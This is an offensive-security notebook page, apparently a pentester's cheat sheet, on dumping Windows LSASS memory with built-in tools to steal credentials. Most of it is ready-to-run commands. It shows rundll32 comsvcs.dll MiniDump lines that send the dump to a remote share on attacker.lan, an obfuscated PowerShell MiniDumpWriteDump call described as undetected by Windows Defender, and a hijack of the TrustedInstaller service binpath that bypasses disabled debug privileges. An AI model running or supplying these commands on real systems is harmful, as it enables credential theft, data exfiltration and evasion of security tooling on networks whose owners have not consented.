---
title: LSASS Dump with builtins
---

[[notes/windows/lsass-dump]] with builtin tools.

With task manager:

- run `taskmgr.exe` as administrator
- select `Details` tab, right click on `lsass.exe`, select `create dump file`
- dump is written to `%userprofile%\AppData\Local\Temp\lsass.DMP`

With `comsvcs.dll`.
Detected by Windows Defender.

=== "cmd"
    ~~~ bat
    tasklist.exe /fi "imagename eq lsass.exe"
    rundll32.exe comsvcs.dll MiniDump %PID% \\attacker.lan@80\share\%COMPUTERNAME%.log full
    ~~~

=== "PowerShell"
    ~~~ powershell
    cd $env:programfiles;cp c:\windows\system32\comsvcs.dll system32.dll;$p = Get-Process lsass;rundll32.exe system32.dll,'#24' $p.id \\attacker.lan@80\share\$env:COMPUTERNAME.log full;rm system32.dll
    ~~~

With PowerShell Windows Error Reporting ([source](https://github.com/sinfulz/JustEvadeBro#lsass-dumping-without-triggering-defender)).
Undetected by Windows Defender.

~~~ powershell
$p = Get-Process lsass
$f = New-Object IO.FileStream("${env:programfiles}\${env:computername}.log", [IO.FileMode]::Create)
[PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting').GetNestedType('Nativ'+'eMethods','Non'+'Public').GetMethod('MiniDu'+'mpWriteD'+'ump',[Reflection.BindingFlags] 'NonPublic,Static').Invoke($null,@($p.Handle,$null,$f.SafeFileHandle,[UInt32]2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$f.Close()
echo $f.Name
~~~

Over *TrustedInstaller* ([source](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled)).
The *TrustedInstaller* always has `SeDebugPrivilege` even if disabled for everybody else trough a GPO.
Starting the modified service throws an error, but the specified command is executed anyways.
Detected by Defender.

~~~ bat
tasklist.exe /fi "imagename eq lsass.exe"
sc.exe qc TrustedInstaller
sc.exe config TrustedInstaller binpath= "C:\Windows\System32\rundll32.exe comsvcs.dll MiniDump %PID% %cd%\%computername%.log full"
sc.exe start TrustedInstaller
sc.exe config TrustedInstaller binPath= "C:\Windows\servicing\TrustedInstaller.exe"
~~~
